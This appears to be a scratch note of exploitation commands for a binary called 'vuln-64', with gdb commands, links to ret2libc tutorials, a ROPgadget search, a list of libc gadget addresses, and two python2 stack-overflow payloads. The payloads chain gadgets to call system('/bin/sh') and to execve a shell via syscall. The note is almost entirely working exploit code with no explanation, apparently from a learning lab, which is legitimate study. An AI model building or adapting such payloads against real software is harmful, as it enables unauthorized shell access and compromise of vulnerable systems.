p system
info proc map

https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc
https://ret2rop.blogspot.com/2018/08/return-to-libc.html

ROPgadget --binary vuln-64 | grep rdi

run < <(python2 -c "from struct import pack; print '\x90'*215+'AAAA'+'A'*12+pack('<Q', 0x7ffff7dbfcd6)+pack('<Q', 0x7ffff7dc03e5)+pack('<Q', 0x7ffff7f6e698)+pa  
ck('<Q', 0x7ffff7de6d60)")

0x0000000000108b13 : pop rdx ; pop rcx ; pop rbx ; ret
0x0000000000045eb0 : pop rax ; ret
0x0000000000029db4 : syscall

0x7ffff7ddbeb0 ; pop rax ; ret
0x7ffff7dc03e5 ; pop rdi ; ret
0x7ffff7dc1e51 ; pop rsi ; ret
0x7ffff7dbfdb4 ; syscall
0x7ffff7f6e698 ; "/bin/sh"
0x7ffff7de6d60 ; system
0x7ffff7e810f0 ; execve
0x7ffff7e9eb13 ; pop rdx ; pop rcx ; pop rbx ; ret

```sh
run < <(python2 -c "from struct import pack; print '\x90'*215+'AAAA'+'A'*12+pack('<Q', 0x7ffff7ddbeb0)+pack('<Q', 0x3b)+pack('<Q', 0x7ffff7dc03e5)+pack('<Q', 0x7ffff7f6e698)+pack('<Q', 0x7ffff7dc1e51)+pack('<Q', 0x0)+pack('<Q', 0x7ffff7e9eb13)+pack('<Q', 0x0)+pack('<Q', 0x0)+pack('<Q', 0x0)+pack('<Q', 0x7ffff7dbfdb4)")
```
